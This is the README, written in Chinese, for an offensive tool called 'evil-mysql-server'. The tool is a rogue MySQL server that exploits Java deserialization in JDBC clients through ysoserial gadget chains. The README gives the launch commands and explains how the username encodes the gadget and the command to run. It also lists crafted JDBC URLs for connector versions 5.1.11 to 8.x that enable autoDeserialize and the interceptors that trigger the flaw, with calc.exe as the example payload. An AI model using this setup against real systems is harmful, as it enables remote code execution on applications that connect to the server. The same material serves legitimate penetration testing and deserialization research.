# evil mysql server

[English](./README.MD) | 简体中文

## 简介

**evil-mysql-server** 是一个针对 jdbc 反序列化漏洞编写的恶意数据库，依赖 ysoserial 。

使用方式

[ysoserial](https://github.com/frohoff/ysoserial)

```shell
./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```

启动成功后，使用 jdbc 进行连接，其中用户名称格式为 `yso_payload_command` , 连接成功后 `evil-mysql-server` 会解析用户名称，并使用如以下命令生成恶意数据返回到 jdbc 客户端。
```shell
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 calc.exe
```

[ysuserial](https://github.com/su18/ysoserial) 这是一个基于原始ysoserial的增强项目。

```shell
./evil-mysql-server -addr 3306 -java java -ysuserial ysuserial-0.9-su18-all.jar
```

启动成功后，使用 jdbc 进行连接，其中用户名称格式为 `yso_payload_command` , 连接成功后 `evil-mysql-server` 会解析用户名称，并使用如以下命令生成恶意数据返回到 jdbc 客户端。
```shell
java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p calc.exe
```

## JDBC url 示例

> 使用 ysuserial 时请修改username的前三个字符为 **ysu** 

**5.1.11-5.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**6.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**8.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

## 致谢

感谢以下项目，带来的启发

- [MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)